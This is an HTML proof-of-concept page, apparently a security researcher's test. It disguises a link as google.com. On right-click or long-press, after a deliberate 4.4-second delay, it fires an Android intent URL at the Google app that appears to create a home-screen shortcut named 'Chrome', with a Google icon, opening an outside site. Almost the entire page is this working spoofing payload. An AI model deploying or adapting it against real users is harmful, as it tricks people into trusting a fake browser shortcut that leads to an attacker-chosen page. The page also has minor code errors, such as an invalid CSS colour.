<!DOCTYPE html> 
<html lang="en"> 
<head> 
<meta charset="UTF-8"> 
<meta name="viewport" content="width=device-width, initial-scale=1"> 
<title>Advanced Android Intent PoC</title> 
<style> 
  body { 
    font-family: system-ui, -apple-system, sans-serif; 
    background: #f0f4f9; 
    color: #202124; 
    min-height: 100vh; 
    margin: 0; 
    display: flex; 
    flex-direction: column; 
    justify-content: center; 
    align-items: center; 
  } 
  .card {
    background: #white;
    padding: 40px;
    border-radius: 12px;
    box-shadow: 0 4px 15px rgba(0,0,0,0.08);
    text-align: center;
    max-width: 450px;
    width: 90%;
  }
  h2 {
    color: #1a73e8;
    margin-top: 0;
  }
  p {
    font-size: 14px;
    color: #5f6368;
    margin-bottom: 25px;
  }
  a.btn { 
    display: inline-block; 
    padding: 14px 24px; 
    background: #1a73e8; 
    color: white; 
    text-decoration: none; 
    font-weight: 600; 
    border-radius: 8px; 
    transition: background 0.2s;
  } 
  a.btn:active { 
    background: #1557b0; 
  } 
  .status {
    margin-top: 20px;
    font-family: monospace;
    font-size: 12px;
    color: #137333;
    background: #e6f4ea;
    padding: 10px;
    border-radius: 6px;
    display: none;
  }
</style> 
</head> 
<body> 

<div class="card">
    <h2>Android Intent Test</h2>
    <p>Right-click (desktop) or long-press (mobile) the button below to trigger the delayed intent payload.</p>
    
    <a href="https://google.com" id="intentLink" target="_blank"> 
      Trigger Android Intent 
    </a> 

    <div id="statusBox" class="status">[STATUS] Ready. Awaiting interaction...</div>
</div>

<script>
let triggered = false;
const link = document.getElementById("intentLink");
const statusBox = document.getElementById("statusBox");

function updateStatus(msg) {
    statusBox.style.display = "block";
    statusBox.textContent = `[STATUS] ${msg}`;
}

// Menangkap berbagai varian event pemicu interaksi awal
['contextmenu', 'auxclick', 'mousedown'].forEach(eventType => {
    link.addEventListener(eventType, (e) => {
        // Khusus contextmenu atau klik sekunder/utama yang relevan
        if (eventType === 'contextmenu' || e.button === 2 || e.button === 0) {
            if (triggered) {
                updateStatus("Already triggered, please wait...");
                return;
            }
            triggered = true;
            updateStatus("Interaction detected. Waiting for delayed execution (4.4s)...");

            setTimeout(() => {
                updateStatus("Executing intent payload via window.location...");
                
                const intentUrl = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
                
                // Menggunakan penugasan langsung untuk memicu navigasi intent scheme
                try {
                    window.location.href = intentUrl;
                } catch (err) {
                    updateStatus(`Error launching intent: ${err.message}`);
                }

                // Reset state setelah jangka waktu tertentu
                setTimeout(() => {
                    triggered = false;
                    updateStatus("Ready for next trigger.");
                }, 1500);
                
            }, 4400); // Pertahankan timing 4400ms sesuai logika asli Anda
        }
    });
});

// Penanganan touch event untuk platform mobile
link.addEventListener("touchstart", () => {
    updateStatus("Touch start registered.");
}, { passive: true });
</script> 

</body> 
</html>
